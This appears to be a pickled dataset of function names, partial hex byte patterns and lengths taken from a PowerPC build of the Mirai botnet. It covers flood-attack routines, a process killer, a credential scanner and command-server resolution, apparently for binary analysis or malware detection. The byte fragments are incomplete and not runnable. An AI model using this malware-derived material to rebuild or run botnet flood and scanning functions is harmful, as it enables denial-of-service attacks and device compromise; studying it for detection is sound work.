(lp0
(S'_init'
p1
S'9421e008a690012400c94800fd80242120a64e80'
p2
L36L
tp3
a(S'__do_global_dtors_aux'
p4
S'9421'
p5
L148L
tp6
a(S'call___do_global_dtors_aux'
p7
S'7c0290011401142110a64e80'
p8
L28L
tp9
a(S'frame_dummy'
p10
S'3d08a639009421'
p11
L108L
tp12
a(S'call_frame_dummy'
p13
S'7c0290011401142110a64e80'
p14
L28L
tp15
a(S'_start'
p16
S'7c0b213dad524838009421'
p17
L72L
tp18
a(S'attack_app_http'
p19
S'9421a691c1e13c019221924151489261514c928192c1e15c9301932193415168938193c1e17c017c1b9423bd33a333a000480031a3e3381038c51b7feb7fe338004800fd7c1ba3e3381038c500e17978a3e338004800557c1ba3e33800003d9061513061008038a0001a2f9900419e1a7fcb7800ff1a7fc378007f9d1a7ebbcd83419d1a3800900108000b9f54002b000be01749ae8100912108bb89839dff7ffb789f01409d003a0060000025384800274800288948002a8948002c002d3848007880002c9200409d017c1b60007ffb78000000ff1bd67cd80018a2781e00901f003a02c3b37fcb78001480419e00c3b34800787f1548002f981f027ca04800977ebbe97fc37800148041bd0048008800637f1aba1d6000cd03165400be7c1880419d003d29c07c007c4a1409a64e80600048002f38871b7c14002f4800b06000480030804800787c140030874800846000480031804800787c140031874800583832873832804800787c1400328738338738867c1b7c14003387c3b37fcb780001ff7fd8409e'
p20
L7076L
tp21
a(S'attack_get_opt_str'
p22
S'2c004081042408a67f2840be007d4b78090429082840be00480008ff7c3380'
p23
L72L
tp24
a(S'attack_get_opt_ip'
p25
S'9421'
p26
L68L
tp27
a(S'attack_get_opt_int'
p28
S'9421'
p29
L72L
tp30
a(S'attack_start'
p31
S'9421e008a69341009361008114c193e11c01247f789e23bd33fb3b1a480083419e002f8341bd7c2f8340be00480041be1089d200409d0049d22a0060007d40507d0340be00e37800387c38009421107d5088008040be007d037fe37fdb46d380000c6b4200c80093dd08a683838314c1831c212000'
p32
L300L
tp33
a(S'attack_parse'
p34
S'9421b008a67d0092211441009261008124c192e12c01304100936100814493c193e14c9001549181789e23840302830084049e02c30084058b054192013b787a0541bc007fd380480078737891001b40007dda2901cccc6000cd29d639007d03912b100b14bd00912b046b4200e038fb7d1489fa3a00419e018a002f9400419e007ea3088b757892a3000009a641'
p35
L712L
tp36
a(S'attack_kill_all'
p37
S'9421e008a6938114c193e11c01242002e9003da9fb787f008341be004800939e003b009fe8dc5295802408a68314c1831c212000'
p38
L124L
tp39
a(S'add_attack'
p40
S'9421e008a6936100811401247d789b23600038899ba3003f60103fa0d2108038757b703d107f013900993d0008a6838314212000'
p41
L136L
tp42
a(S'attack_init'
p43
S'9421'
p44
L192L
tp45
a(S'attack_gre_eth'
p46
S'9421907c0291c191e12c01304100926100814492c192e14c930150932154934100610000a100e16c900174811878bd3380480078a3e338004b'
p47
L1376L
tp48
a(S'attack_gre_ip'
p49
S'9421907c0291c191e12c01304100926100814492c192e14c930150932154934100610000a100e16c90017481789923bd3380480078a3e338004bff197feb7fe3380060'
p50
L1272L
tp51
a(S'attack_tcp_stomp'
p52
S'9421607c0291c191e15c9201609221924101610101a101e17c01800193819493c193e19c9001a49181789523bd338048007c1b03788048007c1ba3e338004b'
p53
L1664L
tp54
a(S'attack_tcp_ack'
p55
S'94217008a67d0091c191e14c920150922154924100610000a100e16c9301702174410061000093c193e18c81349523bd338048007c1ba3e338004b'
p56
L1424L
tp57
a(S'attack_tcp_syn'
p58
S'9421807d0091c191e13c0140922144924100610000a100e15c9301609321934100610000a100e17c018461009723bd338048007c1ba3e338004bff119061007feb7fe3380060'
p59
L1436L
tp60
a(S'attack_udp_plain'
p61
S'9421a07d0092212441009261008134c192e13c0140932144934100610000a100e15c90019181789623bd338048007c1be3788048007c1ba3e3380060'
p62
L648L
tp63
a(S'attack_udp_generic'
p64
S'9421907c0291c191e12c01304100926100814492c192e14c930150932154934100610000a100e16c90017481789923bd338048007c1ba3e338004b'
p65
L1064L
tp66
a(S'attack_udp_vse'
p67
S'9421a07d0092212441009261008134c192e13c0140932144934100610000a100e15c90019181789923bd338048007878a3e338004bffd17feb7fe3380060'
p68
L964L
tp69
a(S'attack_udp_dns'
p70
S'94217008a67d0091c191e14c920150922154924108610808a108e16c9301702174410861080893c193e18c813878bd338048007c1ba3e338004bff017feb7fe3380060'
p71
L1592L
tp72
a(S'checksum_generic'
p73
S'3900840100600039'
p74
L100L
tp75
a(S'checksum_tcpudp'
p76
S'7c33030ce31040002f860100400039'
p77
L176L
tp78
a(S'mem_exists'
p79
S'39000401a67f2040bd0088007d28419e0060004800186b7f58000060004e803801ff380000'
p80
L84L
tp81
a(S'killer_kill'
p82
S'9421'
p83
L44L
tp84
a(S'killer_kill_by_port'
p85
S'9421a092c192e13c0140932144934122612222a122e15c90017c1b6100381048003808803850bd380248003b0093e109e111a1e338eb48007feb4800098340be2298011b011ce11d980119600048003d48003548002d38d4804c'
p86
L1424L
tp87
a(S'killer_init'
p88
S'942100a691c191e1bc9221c461209281d4c192e1dc21e441209361209381f493c193e1fc900104600048007c1b003d690005ff0502000060004b'
p89
L1716L
tp90
a(S'anti_gdb_entry'
p91
S'3d293d2b504e80'
p92
L20L
tp93
a(S'teardown_connection'
p94
S'9421'
p95
L68L
tp96
a(S'ensure_single_instance'
p97
S'9421c093a10093e13c014438009001186000380048003fa0d283419e0138003800380000837880383160087feb38313d0908290180409e002968b00091210c000a423d3b0093e300c13d6978a046952f83409e00002f8040be1088d12f80419e009be900b000380090010c000aa0d2'
p98
L384L
tp99
a(S'main'
p100
S'9421e008a6926105'
p101
L2220L
tp102
a(S'resolve_cnc_addr'
p103
S'9421e008a6938114e11c01246000480038237c1b60004800e19f00419e00000071a0d3007c4b967c49d67c18633a901dfb7800d9600000bd3822a01d0000818114e11c212000'
p104
L184L
tp105
a(S'rand_next'
p106
S'3d6a146058280220020a144010801c09180820635409007d0263906800'
p107
L80L
tp108
a(S'rand_str'
p109
S'9421'
p110
L136L
tp111
a(S'rand_alphastr'
p112
S'9421b008a693814493c193e14c9001547c1b9f2361003c10382137452f9f00409d0063789f00409d00'
p113
L216L
tp114
a(S'rand_init'
p115
S'9421e008a6938114012460004800f93d69ad7c1b00ed3f807f1abc2d906918782002012408a68314212000'
p116
L112L
tp117
a(S'resolv_skip_name'
p118
S'38009005004800442b00030102297c22000100630180409e00810089002f8900'
p119
L116L
tp120
a(S'resolv_entries_free'
p121
S'9421'
p122
L68L
tp123
a(S'resolv_domain_to_hostname'
p124
S'9421e008a693a10001247d789f2383480001400038007c0340a0007c0389002f89419e00890000995d0038007d5b7840004800140a01992b000b01ff017800c000980b0008a6831c212000'
p125
L172L
tp126
a(S'resolv_lookup'
p127
S'942120a692a1109301c0109361109381d4c193e1dc7d7860003881146378a4eb4b'
p128
L980L
tp129
a(S'consume_any_prompt'
p130
S'7c1b0318'
p131
L152L
tp132
a(S'can_consume'
p133
S'7c1b631c091814a522631010d000'
p134
L36L
tp135
a(S'scanner_kill'
p136
S'9421'
p137
L44L
tp138
a(S'deobf'
p139
S'9421e008a693a10093e11c01247d789e2300bd3801388078a5004800f1800080409d002000006901000001a67cf8ae6809ae39004200'
p140
L160L
tp141
a(S'add_auth_entry'
p142
S'9421c092e11c01204100936100813401447c1b9723b8103f6010808084103a907c88bdcb782108cb78'
p143
L316L
tp144
a(S'setup_connection'
p145
S'9421d0a693a10001347f780000010c0110630483419e0048009d3802803834907f0483419e00901f00381c80480071bfeb38004c'
p146
L236L
tp147
a(S'recv_strip_null'
p148
S'9421'
p149
L92L
tp150
a(S'scanner_init'
p151
S'9421a09201204107288134c192e13c0140932144934107489361074c93815493c193e15c90014800028341bd'
p152
L5960L
tp153
a(S'table_retrieve_val'
p154
S'5463382974632c0041'
p155
L40L
tp156
a(S'toggle_obf'
p157
S'5463382974633d09545406065407'
p158
L140L
tp159
a(S'table_lock_val'
p160
S'9421'
p161
L32L
tp162
a(S'table_unlock_val'
p163
S'9421'
p164
L32L
tp165
a(S'add_entry'
p166
S'9421e008a6934100936100811401247d789b23bc2b0078db857800022974bd4a145d49b300012408a683838314212000'
p167
L120L
tp168
a(S'table_init'
p169
S'9421'
p170
L1028L
tp171
a(S'util_strlen'
p172
S'7c1b030060002f804d9e0038006301ae2f80409eff4e80'
p173
L44L
tp174
a(S'util_strncmp'
p175
S'9421e008a6938114c193e11c01247e789f23bcff7ffb78'
p176
L156L
tp177
a(S'util_strcmp'
p178
S'9421e008a693a10093e11c01247e789f23'
p179
L140L
tp180
a(S'util_memcpy'
p181
S'2c004d'
p182
L40L
tp183
a(S'util_strcpy'
p184
S'9421e008a6936100811401247d789c23834b'
p185
L92L
tp186
a(S'util_zero'
p187
S'2c004d'
p188
L40L
tp189
a(S'util_itoa'
p190
S'9421c093e13c01447c2b'
p191
L220L
tp192
a(S'util_memsearch'
p193
S'7c1b86000000409d00003900507c037d2840be007f58000038010039006301ff38ff00'
p194
L92L
tp195
a(S'util_stristr'
p196
S'9421e008a693a10093e11c01247e789d23bf2b'
p197
L204L
tp198
a(S'util_atoi'
p199
S'9421'
p200
L352L
tp201
a(S'util_fdgets'
p202
S'9421e008a69341009361008114c193e11c01247a789b23bc1bc07ffb78837ffb78a00501003b007f0000ff0180409eff7f'
p203
L172L
tp204
a(S'util_local_addr'
p205
S'9421c093a100014438009001180938009003006000380048005d7c1b60002f9f'
p206
L172L
tp207
a(S'ioctl'
p208
S'7c029421d0747f5000780134013801100003ab2b01089e005040419d0080800000203c80006c80409e0000287800cd000c8048005d7c1b004038ff38'
p209
L232L
tp210
a(S'fcntl'
p211
S'7c02390093e12c013404f42b00211000379121102003a100'
p212
L132L
tp213
a(S'fcntl64'
p214
S'7c0293e12c013401380110000300cc90a1007c0074107c1ba2078560'
p215
L100L
tp216
a(S'chdir'
p217
S'7c0293e10c0114000c000274107c1ba2073d38ffe10c2110a64e80'
p218
L72L
tp219
a(S'close'
p220
S'7c0293e10c0114000644000274107c1ba206f593e30060'
p221
L72L
tp222
a(S'fork'
p223
S'7c0293e10c011400020274107c1ba206ad93e30060'
p224
L72L
tp225
a(S'getpid'
p226
S'7c0293e10c01140014000274107c1ba20693e30060'
p227
L72L
tp228
a(S'getppid'
p229
S'7c0293e10c0114004044000274107c1ba2061d38ffe10c2110a64e80'
p230
L72L
tp231
a(S'kill'
p232
S'7c0293e10c011400257c0074107c1ba2050060'
p233
L72L
tp234
a(S'open'
p235
S'7c02390093e12c01348090a100390091210c21102003a94b78000274107c1ba2050060'
p236
L120L
tp237
a(S'creat'
p238
S'7c23804c'
p239
L16L
tp240
a(S'prctl'
p241
S'7c0293e10c011400ab44000274107c1ba2050060'
p242
L72L
tp243
a(S'read'
p244
S'7c0293e10c011400030274107c1ba20493e30060'
p245
L72L
tp246
a(S'readlink'
p247
S'7c0293e10c0114005544000274107c1ba20493e30060'
p248
L72L
tp249
a(S'select'
p250
S'7c0293e10c0114008e0274107c1ba20493e30060'
p251
L72L
tp252
a(S'setsid'
p253
S'7c0293e10c0114004244000274107c1ba20393e30060'
p254
L72L
tp255
a(S'sigprocmask'
p256
S'2c007c027c1bc02b0000ae93e10c'
p257
L120L
tp258
a(S'time'
p259
S'7c0293e10c0114000d7c0074107c1ba20338ffe10c2110a64e80'
p260
L72L
tp261
a(S'unlink'
p262
S'7c0293e10c0114000a0274107c1ba20293e30060'
p263
L72L
tp264
a(S'write'
p265
S'7c0293e10c01140004000274107c1ba20238ffe10c2110a64e80'
p266
L72L
tp267
a(S'closedir'
p268
S'7c023c10bf7f780134a3003800eb7f788040be0239'
p269
L164L
tp270
a(S'opendir'
p271
S'7c023800e000'
p272
L272L
tp273
a(S'readdir'
p274
S'9421d0a63c10bfa31b8408eb900134007feb480080043f007f00bd00801400010041a10048003c00001f003f007f0ca9007c021f001d007c582f80419eff8048007febbb08a638004e80'
p275
L192L
tp276
a(S'__errno_location'
p277
S'3c1038c0'
p278
L12L
tp279
a(S'clock'
p280
S'9421e008a6380800807c02012463102120a654637e80'
p281
L56L
tp282
a(S'memcpy'
p283
S'54a9'
p284
L156L
tp285
a(S'memmove'
p286
S'7f18682bbcffe814432a'
p287
L164L
tp288
a(S'memset'
p289
S'54a92363fc514a44514a80'
p290
L144L
tp291
a(S'tcgetattr'
p292
S'9421c0bf9f2380a1749001444c'
p293
L156L
tp294
a(S'tcsetattr'
p295
S'2f8401a69421b041007c1b01547c2b9e002f8402002f8400c0419e00480010c0480020fd09803800900300003fc08000a0009f008118410089008034df38210c6100914100012bc14b'
p296
L356L
tp297
a(S'inet_addr'
p298
S'9421e008a6380000a52f8338ff008080242120a64e80'
p299
L52L
tp300
a(S'accept'
p301
S'9421e008a690610038053800a11380242120a64e80'
p302
L52L
tp303
a(S'bind'
p304
S'9421e008a690610038028124a11280242120a64e80'
p305
L52L
tp306
a(S'connect'
p307
S'9421e008a690610038038124a11280242120a64e80'
p308
L52L
tp309
a(S'getsockname'
p310
S'9421e008a69061003806908108a11238007c03'
p311
L52L
tp312
a(S'getsockopt'
p313
S'9421d0a6906100389000900134a100e1181201342130a64e80'
p314
L60L
tp315
a(S'listen'
p316
S'9421e008a69061003804810800292120a64e80'
p317
L48L
tp318
a(S'recv'
p319
S'9421e008a6906100380a8124a10000f180242120a64e80'
p320
L56L
tp321
a(S'recvfrom'
p322
S'9421d0a6906100380c8108a100e11800b101342130a64e80'
p323
L64L
tp324
a(S'send'
p325
S'9421e008a690610038098124a100007901242120a64e80'
p326
L56L
tp327
a(S'sendto'
p328
S'9421d0a6906100380b8134a100e11800392130a64e80'
p329
L64L
tp330
a(S'setsockopt'
p331
S'9421d0a6906100380e908108a100e1181080342130a64e80'
p332
L60L
tp333
a(S'socket'
p334
S'9421e008a690610038018124a11080242120a64e80'
p335
L52L
tp336
a(S'raise'
p337
S'7c02bf7d780124ff7d0124a4ebbb2120a64bfff4'
p338
L48L
tp339
a(S'sigaddset'
p340
S'7c02900114802f80408118f8d1001639'
p341
L76L
tp342
a(S'sigemptyset'
p343
S'7c0238004b'
p344
L44L
tp345
a(S'signal'
p346
S'2f84'
p347
L224L
tp348
a(S'__sigismember'
p349
S'38fa5484'
p350
L40L
tp351
a(S'__sigaddset'
p352
S'3801fa5484'
p353
L40L
tp354
a(S'__sigdelset'
p355
S'38'
p356
L40L
tp357
a(S'malloc'
p358
S'2c007c02bf0134a20038'
p359
L344L
tp360
a(S'calloc'
p361
S'2f837c02bfe4d69001149e001f1b7f0041bef59938000300007ffb78'
p362
L112L
tp363
a(S'free'
p364
S'2c007c02bf0124'
p365
L256L
tp366
a(S'realloc'
p367
S'2c007c02bf7c780124a2'
p368
L304L
tp369
a(S'__heap_alloc'
p370
S'8103002b00390c230000007f584041bc008a40409c00690000090809088800007d53780804001853780300000b90090048509100380c808100409eff80'
p371
L160L
tp372
a(S'__heap_alloc_at'
p373
S'817805007d58503900894041bd2040be007f289c0005009c008100419e000b084b008100419e002a0480912800007c18a3004e808100ff4e80'
p374
L156L
tp375
a(S'__heap_link_free_area'
p376
S'2f8500a400419e008504000886000090860800'
p377
L44L
tp378
a(S'__heap_link_free_area_after'
p379
S'2c0041'
p380
L28L
tp381
a(S'__heap_free'
p382
S'7c027c1b6000bf0124e30014001000eb78ff049f0038000040409e'
p383
L300L
tp384
a(S'atol'
p385
S'38004800'
p386
L12L
tp387
a(S'strtol'
p388
S'38004800'
p389
L8L
tp390
a(S'_stdlib_strto_l'
p391
S'7c023d211499230134be337f7849d2003b0089000809700040'
p392
L436L
tp393
a(S'exit'
p394
S'9421d0a63c10bfa0d23b0038787f78c378013400c5eb4800b5200280419e007ffb7809a64e80c378804800954800f53d29008900004bff7ffb7800'
p395
L132L
tp396
a(S'sleep'
p397
S'7c1b08a6942140bf01c4013920a6380039000091490039ff107d3a00'
p398
L468L
tp399
a(S'__uClibc_fini'
p400
S'3d20020239d07d585093e10c7f700114001829e87c032f9f003b'
p401
L148L
tp402
a(S'__pthread_return_0'
p403
S'380000'
p404
L8L
tp405
a(S'__check_one_fd'
p406
S'9421'
p407
L96L
tp408
a(S'__uClibc_init'
p409
S'7c023d200029000114090080409e00003d0bbc9009b09a3d29008900008014e10c2110a64bff8014e10c2110a64e80'
p410
L128L
tp411
a(S'__uClibc_main'
p412
S'7c023d21947c2b01b4807c022ba84500a010915dd29a7c331e007c3b8a000090bd003800'
p413
L620L
tp414
a(S'__socketcall'
p415
S'7c0293e10c01140044000274107c1ba2e80060'
p416
L72L
tp417
a(S'_exit'
p418
S'7c02bf7e780114000178000274107c1b'
p419
L60L
tp420
a(S'fstat'
p421
S'9421907c023b0023006c7feb44000274103b1b'
p422
L116L
tp423
a(S'__getdents'
p424
S'7c02bf9f230124007d7e7981140044810cbf00901f007f00bf'
p425
L144L
tp426
a(S'__getdents64'
p427
S'7c0281000500be00d078216e7c23b77876780117541b38007fdb000274107c1b'
p428
L344L
tp429
a(S'getegid'
p430
S'7c0293e10c011400320274107c1ba2e593e30060'
p431
L72L
tp432
a(S'geteuid'
p433
S'7c0293e10c011400310274107c1ba2e593e30060'
p434
L72L
tp435
a(S'getgid'
p436
S'7c0293e10c0114002f44000274107c1ba2e493e30060'
p437
L72L
tp438
a(S'getuid'
p439
S'7c0293e10c011400180274107c1ba2e493e30060'
p440
L72L
tp441
a(S'lseek64'
p442
S'7c027c'
p443
L128L
tp444
a(S'nanosleep'
p445
S'7c0293e10c011400a27c0074107c1ba2e393e30060'
p446
L72L
tp447
a(S'sbrk'
p448
S'7c02bfe0027e78600080d48040be0500009e0080d41f036014be0500003b'
p449
L112L
tp450
a(S'times'
p451
S'7c0293e10c0114002b0274107c1ba2e393e30060'
p452
L72L
tp453
a(S'__xstat64_conv'
p454
S'9421e008a638007c237c78807feb900124ff4981043d003c083d001c101c141d00901d001d0081915d003c303d001c383c4081915d00001d001d001d008120a64e80'
p455
L204L
tp456
a(S'__xstat_conv'
p457
S'9421e008a638007c237c78807feb900124ff7d1c0020003d001d00901d001d00901d001d00913d001c1c1d00901d001d00901d00901d00901d008120a64e80'
p458
L176L
tp459
a(S'mempcpy'
p460
S'7c02bf7c780124bde180247c1481a638004e80'
p461
L52L
tp462
a(S'inet_aton'
p463
S'2c0041'
p464
L192L
tp465
a(S'sigaction'
p466
S'9421c03900bf9f23be1b0144380041'
p467
L196L
tp468
a(S'_dl_aux_init'
p469
S'801c2002200209d000'
p470
L28L
tp471
a(S'brk'
p472
S'9421'
p473
L52L
tp474
a(S'__syscall_rt_sigaction'
p475
S'7c0293e10c011400ad44000274107c1ba2dd93e30060'
p476
L72L
tp477
a(S'__syscall_error'
p478
S'7c02bf7d780124'
p479
L52L
tp480
a(S'__do_global_ctors_aux'
p481
S'7c023d29ec93e10c0114e9'
p482
L80L
tp483
a(S'call___do_global_ctors_aux'
p484
S'7c0290011401142110a64e80'
p485
L28L
tp486
a(S'_fini'
p487
S'9421e008a6900124'
p488
L32L
tp489
a.